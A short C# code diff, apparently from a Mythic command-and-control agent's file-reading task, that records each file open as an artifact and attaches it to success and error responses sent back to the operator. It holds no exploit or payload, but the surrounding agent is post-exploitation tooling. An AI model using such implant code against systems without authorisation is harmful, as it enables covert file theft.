@@ -115,6 +115,11 @@ namespace Tasks
                 {
                     TT.Task.Factory.StartNew(_flushContents, _cancellationToken.Token);
                     FileStream fs = null;
+                    FileInfo finfo = new FileInfo(parameters.Path);
+                    IMythicMessage[] artifacts = new IMythicMessage[]
+                    {
+                        Artifact.FileOpen(finfo.FullName)
+                    };
                     try
                     {
                         fs = File.OpenRead(parameters.Path);
@@ -131,13 +136,13 @@ namespace Tasks
                         });
                         _completed = true;
                         _complete.Set();
-                        resp = CreateTaskResponse("", true);
+                        resp = CreateTaskResponse("", true, "completed", artifacts);
                     } catch (UnauthorizedAccessException ex)
                     {
-                        resp = CreateTaskResponse("Access denied.", true, "error");
+                        resp = CreateTaskResponse("Access denied.", true, "error", artifacts);
                     } catch (Exception ex)
                     {
-                        resp = CreateTaskResponse($"Unable to read {parameters.Path}: {ex.Message}", true, "error");
+                        resp = CreateTaskResponse($"Unable to read {parameters.Path}: {ex.Message}", true, "error", artifacts);
                     }
                 }
                 _agent.GetTaskManager().AddTaskResponseToQueue(resp);
